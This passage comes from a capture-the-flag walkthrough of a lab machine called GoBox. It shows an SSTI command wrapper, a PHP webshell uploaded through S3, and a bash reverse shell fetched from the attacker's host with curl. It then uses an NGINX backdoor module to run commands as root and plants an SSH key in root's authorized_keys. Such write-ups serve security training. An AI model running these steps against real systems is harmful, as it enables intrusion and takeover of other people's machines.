	<span class="k">def</span> <span class="nf">default</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">line</span><span class="p">):</span>
		<span class="n">exploit</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
	<span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
		<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>

	<span class="n">term</span> <span class="o">=</span> <span class="n">GoboxSSTI</span><span class="p">()</span>
	<span class="k">try</span><span class="p">:</span>	
		<span class="n">term</span><span class="o">.</span><span class="n">cmdloop</span><span class="p">()</span>
	<span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
		<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div><p>Using that wrapper, I have ability to send OS command from my CLI to the compromised container.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ kali@kali Â«exploitsÂ» Â«10.10.14.97Â»
$ python3 ./gobox_ssti.py http://10.10.11.113:8080/forgot/
&gt; id
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
&gt; uname -a
Linux aws 5.4.0-81-generic <span class="c1">#91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
</code></pre></div><h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="s3-enumeration">S3 enumeration</h4>
<p>While I was enumerating the installed binary to get a foothold on the container, I found an <code>aws</code> binary.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; ls -l /usr/bin/aws
-rwxr-xr-x <span class="m">1</span> root root <span class="m">815</span> Jun <span class="m">17</span>  <span class="m">2020</span> /usr/bin/aws
&gt; aws 
usage: aws <span class="o">[</span>options<span class="o">]</span> &lt;command&gt; &lt;subcommand&gt; <span class="o">[</span>&lt;subcommand&gt; ...<span class="o">]</span> <span class="o">[</span>parameters<span class="o">]</span>
To see <span class="nb">help</span> text, you can run:

  aws <span class="nb">help</span>
  aws &lt;command&gt; <span class="nb">help</span>
  aws &lt;command&gt; &lt;subcommand&gt; <span class="nb">help</span>
aws: error: the following arguments are required: <span class="nb">command</span>
</code></pre></div><p>I will send <code>aws s3 ls</code>  to list the available buckets and there is one called <code>website</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; aws s3 ls
2021-09-07 07:32:42 website
</code></pre></div><p>The bucket contains 4 files.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; aws s3 ls website
PRE css/
2021-09-07 07:32:42    <span class="m">1294778</span> bottom.png
2021-09-07 07:32:42     <span class="m">165551</span> header.png
2021-09-07 07:32:42          <span class="m">5</span> index.html
2021-09-07 07:32:42       <span class="m">1803</span> index.php
</code></pre></div><p>When I read the contents of <code>index.php</code> file, I&rsquo;m sure it&rsquo;s the source code of the homepage (port 80).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; aws s3 cp s3://website/index.php /tmp/id.php
download: s3://website/index.php to ../../tmp/id.php<span class="o">)</span> remaining
&gt; cat /tmp/id.php
&lt;!DOCTYPE html&gt;
&lt;htm l <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span>&gt;

&lt;head&gt;
  &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span>&gt;
  &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
  &lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;X-UA-Compatible&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;ie=edge&#34;</span>&gt;
  &lt;title&gt;Hacking eSports <span class="p">|</span> <span class="o">{{</span>.Title<span class="o">}}</span>&lt;/title&gt;
  &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&#34;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&#34;bootstrap-css&#34;</span>&gt;
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>I also find that I have write access on this bucket.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; <span class="nb">echo</span> <span class="s1">&#39;&lt;?php phpinfo(); ?&gt;&#39;</span> &gt; /tmp/iamf.php
upload: ../../tmp/iamf.php to s3://website/iamf.phple<span class="o">(</span>s<span class="o">)</span> remaining
&gt; aws s3 cp /tmp/iamf.php s3://website/
upload: ../../tmp/iamf.php to s3://website/iamf.phple<span class="o">(</span>s<span class="o">)</span> remaining
</code></pre></div><p>When I visit back the homepage and append my filename <code>10.10.11.113/iamf.php</code>, it is there and it processes the PHP code.</p>
<p><div class="img-container"><img src="imgs/image-20210908091305043.png" alt="image-20210908091305043"  /></div>
</p>
<p>Also, instead of <code>Linux aws ...</code>  it returns with <code>Linux gobox ...</code>, that means the homepage is hosted in a different system.</p>
<h4 id="webshell">Webshell</h4>
<p>This time I will upload a PHP webshell, but first I will encode the payload with base64 to avoid the bad characters.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ kali@kali Â«~Â» Â«10.10.14.97Â»
$ <span class="nb">echo</span> <span class="s1">&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[f]) ?&gt;&#39;</span> <span class="p">|</span> base64 -w0
PD9waHAgZWNobyAiPHByZT4iOyBzeXN0ZW0oJF9HRVRbZl0pID8+Cg<span class="o">==</span>
</code></pre></div><p>I will send and transfer that payload to S3 via the RCE wrapper.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; <span class="nb">echo</span> <span class="s1">&#39;PD9waHAgZWNobyAiPHByZT4iOyBzeXN0ZW0oJF9HRVRbZl0pID8+Cg==&#39;</span> <span class="p">|</span> base64 -d &gt; /tmp/iamf-shell.php

&gt; aws s3 cp /tmp/iamf-shell.php s3://website/iamf-shell.php
upload: ../../tmp/iamf-shell.php to s3://website/iamf-shell.phpg
</code></pre></div><p>And my webshell is now accessible on the homepage site.</p>
<p><div class="img-container"><img src="imgs/image-20210908163727213.png" alt="image-20210908163727213"  /></div>
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>This system has some Linux binaries that I can use to get a foothold, one of which is <code>curl</code>. First, I will craft my reverse shell script and host it afterwards.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ kali@kali Â«goboxÂ» Â«10.10.14.97Â» 
$ mkrev tun0 bash <span class="p">|</span> tee exploits/rce.sh
bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.97/53 0&gt;&amp;1&#34;</span>
</code></pre></div><p>On my webshell, I will  grab that script and save it to target&rsquo;s <code>/tmp/</code> dir.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">http://10.10.11.113/iamf-shell.php?f=curl%20-s%20%20http://10.10.14.97:8080/rce.sh%20%20%3E%20/tmp/rce.sh
</code></pre></div><p>Now I will get my listener ready and execute my reverse shell script.</p>
<p><div class="img-container"><img src="imgs/image-20210908165236310.png" alt="image-20210908165236310"  /></div>
</p>
<p>On my listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ kali@kali Â«goboxÂ» Â«10.10.14.97Â»
$ nc -nvlp <span class="m">53</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
connect to <span class="o">[</span>10.10.14.97<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.113<span class="o">]</span> <span class="m">59898</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>770<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
www-data@gobox:/opt/website$
</code></pre></div><p>I will do the PTY trick and upgrade my shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/opt/website$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@gobox:/opt/website$ ^Z
<span class="o">[</span>2<span class="o">]</span>  + <span class="m">4264</span> suspended  nc -nvlp <span class="m">53</span>
â†’ kali@kali Â«goboxÂ» Â«10.10.14.97Â»
$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>
<span class="o">[</span>2<span class="o">]</span>  - <span class="m">4264</span> continued  nc -nvlp <span class="m">53</span>

www-data@gobox:/opt/website$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
www-data@gobox:/opt/website$ stty cols <span class="m">171</span> rows <span class="m">30</span>
</code></pre></div><p>It turns out that the user flag is readable by <code>www-data</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/$ cat /etc/passwd <span class="p">|</span> grep sh$
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
www-data@gobox:/$ ls -lR /home/ubuntu
/home/ubuntu:
total <span class="m">4</span>
-rw-r--r-- <span class="m">1</span> root root <span class="m">33</span> Aug <span class="m">26</span> 21:10 user.txt
www-data@gobox:/$ cat /home/ubuntu/user.txt
d6b91...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>When enumerating the network connections, there are some ports that seem to be missed by my <code>nmap</code> scan (I&rsquo;ll look into this in the <a href="#explore">explore</a> section).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/opt$ netstat -tlpn
<span class="o">(</span>Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.<span class="o">)</span>
Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9000            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9001            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:4566            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> :::9000                 :::*                    LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> :::9001                 :::*                    LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN
</code></pre></div><p>I immediately inspected the NGINX configuration file under <code>/etc/nginx/sites-enabled/</code>. There is only one file there called <code>default</code> and it contains the following configurations:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nginx" data-lang="nginx"><span class="c1"># LocalStack that simulates AWS S3
</span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
        <span class="kn">listen</span> <span class="mi">4566</span> <span class="s">default_server</span><span class="p">;</span>


        <span class="kn">root</span> <span class="s">/var/www/html</span><span class="p">;</span>

        <span class="kn">index</span> <span class="s">index.html</span> <span class="s">index.htm</span> <span class="s">index.nginx-debian.html</span><span class="p">;</span>

        <span class="kn">server_name</span> <span class="s">_</span><span class="p">;</span>


        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
                <span class="kn">if</span> <span class="s">(</span><span class="nv">$http_authorization</span> <span class="s">!~</span> <span class="s">&#34;(.*)SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz(.*)&#34;)</span> <span class="p">{</span>
                    <span class="kn">return</span> <span class="mi">403</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="kn">proxy_pass</span> <span class="s">http://127.0.0.1:9000</span><span class="p">;</span>
        <span class="p">}</span>

<span class="p">}</span>

<span class="c1"># Homepage
</span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
        <span class="kn">listen</span> <span class="mi">80</span><span class="p">;</span>
        <span class="kn">root</span> <span class="s">/opt/website</span><span class="p">;</span>
        <span class="kn">index</span> <span class="s">index.php</span><span class="p">;</span>

        <span class="kn">location</span> <span class="p">~</span> <span class="sr">[^/]\.php(/|$)</span> <span class="p">{</span>
            <span class="kn">fastcgi_index</span> <span class="s">index.php</span><span class="p">;</span>
            <span class="kn">fastcgi_param</span> <span class="s">REQUEST_METHOD</span> <span class="nv">$request_method</span><span class="p">;</span>
            <span class="kn">fastcgi_param</span> <span class="s">SCRIPT_FILENAME</span> <span class="nv">$document_root$fastcgi_script_name</span><span class="p">;</span>
            <span class="kn">fastcgi_param</span> <span class="s">QUERY_STRING</span> <span class="nv">$query_string</span><span class="p">;</span>


            <span class="kn">fastcgi_pass</span> <span class="s">unix:/tmp/php-fpm.sock</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>

<span class="c1"># Login page
</span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
        <span class="kn">listen</span> <span class="mi">8080</span><span class="p">;</span>
        <span class="kn">add_header</span> <span class="s">X-Forwarded-Server</span> <span class="s">golang</span><span class="p">;</span>
        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
                <span class="kn">proxy_pass</span> <span class="s">http://127.0.0.1:9001</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>

<span class="c1"># unknown
</span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
        <span class="kn">listen</span> <span class="n">127.0.0.1</span><span class="p">:</span><span class="mi">8000</span><span class="p">;</span>
        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
                <span class="kn">command</span> <span class="no">on</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>Based on the configuration above and the <code>docker-compose.yml</code> file I found under <code>/opt/website/</code>, the server that listens on port 4566 is routed into the internal port 9000 which is mapped into the LocalStack container (host:4566 [with auth]-&gt;host:9000-&gt;container-localstack:4566).</p>
<p>To confirm that, I run another scan against port 4566, and <code>nmap</code> shows that it&rsquo;s open, but it&rsquo;s forbidden because there is authorization check.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ kali@kali Â«goboxÂ» Â«10.10.14.97Â»
$ nmap -sV -sC -p4566 10.10.11.113
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-08 06:51 EDT
Nmap scan report <span class="k">for</span> gobox.htb <span class="o">(</span>10.10.11.113<span class="o">)</span>
Host is up <span class="o">(</span>0.047s latency<span class="o">)</span>.

PORT     STATE SERVICE VERSION
4566/tcp open  http    nginx
<span class="p">|</span>_http-title: <span class="m">403</span> Forbidden

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 13.35 seconds
</code></pre></div><p>Since I know the correct authorization value, I can add it to the authorization header and get access to port 4566.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ kali@kali Â«goboxÂ» Â«10.10.14.97Â»
$ curl -sv http://10.10.11.113:4566/ -H <span class="s1">&#39;Authorization: Basic SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz&#39;</span>
*   Trying 10.10.11.113:4566...
* Connected to 10.10.11.113 <span class="o">(</span>10.10.11.113<span class="o">)</span> port <span class="m">4566</span> <span class="o">(</span><span class="c1">#0)</span>
&gt; GET / HTTP/1.1
&gt; Host: 10.10.11.113:4566
&gt; User-Agent: curl/7.74.0
&gt; Accept: */*
&gt; Authorization: Basic SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
&gt;
* Mark bundle as not supporting multiuse
&lt; HTTP/1.1 <span class="m">404</span>
&lt; Server: nginx
&lt; Date: Thu, <span class="m">09</span> Sep <span class="m">2021</span> 07:33:54 GMT
&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
&lt; Content-Length: <span class="m">21</span>
&lt; Connection: keep-alive
&lt; access-control-allow-origin: *
&lt; access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH
&lt; access-control-allow-headers: authorization,content-type,content-length,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging,amz-sdk-invocation-id,amz-sdk-request
&lt; access-control-expose-headers: x-amz-version-id
&lt;
* Connection <span class="c1">#0 to host 10.10.11.113 left intact</span>
<span class="o">{</span><span class="s2">&#34;status&#34;</span>: <span class="s2">&#34;running&#34;</span><span class="o">}</span>
</code></pre></div><p>As for port 80 and 8080, it&rsquo;s clear that they are the homepage and the login page site.</p>
<p>The next one is request routing for port 8000, this is my first time to see &ldquo;command on&rdquo; written on NGINX&rsquo;s config file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nginx" data-lang="nginx"><span class="k">server</span> <span class="p">{</span>
        <span class="kn">listen</span> <span class="n">127.0.0.1</span><span class="p">:</span><span class="mi">8000</span><span class="p">;</span>
        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
                <span class="kn">command</span> <span class="no">on</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>When I try to interact with it, it returns nothing.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/opt$ curl -s http://127.0.0.1:8000
www-data@gobox:/opt$ curl -I http://127.0.0.1:8000
curl: <span class="o">(</span>52<span class="o">)</span> Empty reply from server
</code></pre></div><p>With <code>nc</code>, it returns a &ldquo;Bad Request&rdquo;.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/$ nc -vn 127.0.0.1 <span class="m">8000</span>
Connection to 127.0.0.1 <span class="m">8000</span> port <span class="o">[</span>tcp/*<span class="o">]</span> succeeded!
/
HTTP/1.1 <span class="m">400</span> Bad Request
Server: nginx
Date: Wed, <span class="m">08</span> Sep <span class="m">2021</span> 11:13:48 GMT
Content-Type: text/html
Content-Length: <span class="m">150</span>
Connection: close

&lt;html&gt;
&lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;

</code></pre></div><p>If I look at the date modified of the NGINX folder, there are 6 folders that were modified on August 26 at the same time.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ ls -lt
total <span class="m">64</span>
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 snippets
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 sites-available
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 sites-enabled
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 modules-enabled
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 conf.d
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 modules-available
-rw-r--r-- <span class="m">1</span> root root <span class="m">1484</span> Aug <span class="m">24</span> 20:30 nginx.conf
-rw-r--r-- <span class="m">1</span> root root <span class="m">3071</span> Feb  <span class="m">4</span>  <span class="m">2019</span> win-utf
-rw-r--r-- <span class="m">1</span> root root <span class="m">1077</span> Feb  <span class="m">4</span>  <span class="m">2019</span> fastcgi.conf
-rw-r--r-- <span class="m">1</span> root root <span class="m">1007</span> Feb  <span class="m">4</span>  <span class="m">2019</span> fastcgi_params
-rw-r--r-- <span class="m">1</span> root root <span class="m">2837</span> Feb  <span class="m">4</span>  <span class="m">2019</span> koi-utf
-rw-r--r-- <span class="m">1</span> root root <span class="m">2223</span> Feb  <span class="m">4</span>  <span class="m">2019</span> koi-win
-rw-r--r-- <span class="m">1</span> root root <span class="m">3957</span> Feb  <span class="m">4</span>  <span class="m">2019</span> mime.types
-rw-r--r-- <span class="m">1</span> root root  <span class="m">180</span> Feb  <span class="m">4</span>  <span class="m">2019</span> proxy_params
-rw-r--r-- <span class="m">1</span> root root  <span class="m">636</span> Feb  <span class="m">4</span>  <span class="m">2019</span> scgi_params
-rw-r--r-- <span class="m">1</span> root root  <span class="m">664</span> Feb  <span class="m">4</span>  <span class="m">2019</span> uwsgi_params
</code></pre></div><p>When I visit the <code>modules-enabled</code> folder, I find a module with a suspicious name &ldquo;backdoor&rdquo;!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ ls -l modules-enabled
total <span class="m">12</span>
-rw-r--r-- <span class="m">1</span> root root <span class="m">48</span> Aug <span class="m">23</span> 20:50 50-backdoor.conf
lrwxrwxrwx <span class="m">1</span> root root <span class="m">61</span> Aug <span class="m">23</span> 14:43 50-mod-http-image-filter.conf -&gt; /usr/share/nginx/modules-available/mod-http-image-filter.conf
lrwxrwxrwx <span class="m">1</span> root root <span class="m">60</span> Aug <span class="m">23</span> 14:43 50-mod-http-xslt-filter.conf -&gt; /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
lrwxrwxrwx <span class="m">1</span> root root <span class="m">48</span> Aug <span class="m">23</span> 14:43 50-mod-mail.conf -&gt; /usr/share/nginx/modules-available/mod-mail.conf
lrwxrwxrwx <span class="m">1</span> root root <span class="m">50</span> Aug <span class="m">23</span> 14:43 50-mod-stream.conf -&gt; /usr/share/nginx/modules-available/mod-stream.conf
</code></pre></div><p>The module loads a <code>.so</code> file called <code>ngx_http_execute_module.so</code>. I found that file under <code>/usr/lib/nginx/modules/</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ cat modules-enabled/50-backdoor.conf
load_module modules/ngx_http_execute_module.so
www-data@gobox:/etc/nginx$ find / -type f -name <span class="s2">&#34;ngx_http_execute_module.so&#34;</span> 2&gt;/dev/null
/usr/lib/nginx/modules/ngx_http_execute_module.so
www-data@gobox:/etc/nginx$ file /usr/lib/nginx/modules/ngx_http_execute_module.so
/usr/lib/nginx/modules/ngx_http_execute_module.so: ELF 64-bit LSB shared object, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, BuildID<span class="o">[</span>sha1<span class="o">]=</span>4279ae42bf642b21378aa43c06b52f4d0b89f2ad, with debug_info, not stripped
</code></pre></div><p>I&rsquo;m trying to find the origin of this module by grabbing some readable code using  <code>strings</code>. It turns out the backdoor is taken from this Github repository: <a href="https://github.com/limithit/NginxExecute">NginxExecute</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ kali@kali Â«lootÂ» Â«10.10.14.97Â»
$ strings ngx_http_execute_module.so <span class="p">|</span> grep <span class="s1">&#39;.c$&#39;</span>
ngx_pcalloc
__ctype_b_loc
realloc
malloc
ngxexecute_strncpy_alloc
ngxexecute_strcpy_alloc
~iHc
/home/ubuntu/NginxExecute//ngx_result.c
7src
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h4 id="nginx-backdoor">NGINX Backdoor</h4>
<p>According to the README file from the repository, I just need to send a HTTP request with <code>?system.run[command]</code>, but it doesn&rsquo;t work here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ curl -v <span class="s2">&#34;http://127.0.0.1:8000/?system.run[whoami]&#34;</span>
* Trying 127.0.0.1:8000...
* TCP_NODELAY <span class="nb">set</span>
* Connected to 127.0.0.1 <span class="o">(</span>127.0.0.1<span class="o">)</span> port <span class="m">8000</span> <span class="o">(</span><span class="c1">#0)</span>
&gt; GET /?system.run<span class="o">[</span>ifconfig<span class="o">]</span> HTTP/1.1
&gt; Host: 127.0.0.1:8000
&gt; User-Agent: curl/7.68.0
&gt; Accept: */*
&gt;
* Empty reply from server
* Connection <span class="c1">#0 to host 127.0.0.1 left intact</span>
curl: <span class="o">(</span>52<span class="o">)</span> Empty reply from server
</code></pre></div><p>Running another <code>strings</code> command against the backdoor reveals it uses <code>ippsec.run</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ kali@kali Â«lootÂ» Â«10.10.14.97Â»
$ strings ngx_http_execute_module.so <span class="p">|</span> grep <span class="s1">&#39;run&#39;</span>
ippsec.run
</code></pre></div><p>Now if I send <code>?ippsec.run[whoami]</code>, it returns:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ curl -g <span class="s2">&#34;http://127.0.0.1:8000/?ippsec.run[whoami]&#34;</span>
root
</code></pre></div><p>Using the previous reverse shell script I dropped on <code>/tmp/</code>, I can get an interactive shell access as root, but then the shell gets exited by itself.</p>
<p><div class="img-container"><img src="imgs/image-20210908184311943.png" alt="image-20210908184311943"  /></div>
</p>
<p>So instead, I will inject my SSH public key.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H&#39;</span> &gt; /tmp/iamf
www-data@gobox:/etc/nginx$ curl -g <span class="s2">&#34;http://127.0.0.1:8000/?ippsec.run[cat /tmp/iamf | tee /root/.ssh/authorized_keys]&#34;</span>
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H
</code></pre></div><p>Now I can SSH login as root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ kali@kali Â«goboxÂ» Â«10.10.14.97Â»
$ ssh root@10.10.11.113
Welcome to Ubuntu 20.04.3 LTS <span class="o">(</span>GNU/Linux 5.4.0-81-generic x86_64<span class="o">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed <span class="m">08</span> Sep <span class="m">2021</span> 11:52:18 AM UTC

  System load:                      0.0
  Usage of /:                       37.1% of 9.72GB
  Memory usage:                     20%
  Swap usage:                       0%
  Processes:                        <span class="m">244</span>
  Users logged in:                  <span class="m">0</span>
  IPv4 address <span class="k">for</span> br-bb21b8b9b286: 172.28.0.1
  IPv4 address <span class="k">for</span> docker0:         172.17.0.1
  IPv4 address <span class="k">for</span> ens160:          10.10.11.113


<span class="m">0</span> updates can be applied immediately.


The list of available updates is more than a week old.
To check <span class="k">for</span> new updates run: sudo apt update

Last login: Thu Aug <span class="m">26</span> 23:56:12 <span class="m">2021</span>
root@gobox:~#
</code></pre></div><p>I can grab the root flag as well.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@gobox:~# ls -l
total <span class="m">12</span>
-rwxr-xr-x <span class="m">1</span> root root  <span class="m">536</span> Aug <span class="m">24</span> 20:33 iptables.sh
-rw------- <span class="m">1</span> root root   <span class="m">33</span> Aug <span class="m">26</span> 21:10 root.txt
drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 snap
root@gobox:~# cat root.txt
81d35...<span class="o">[</span>SNIP<span class="o">]</span>...
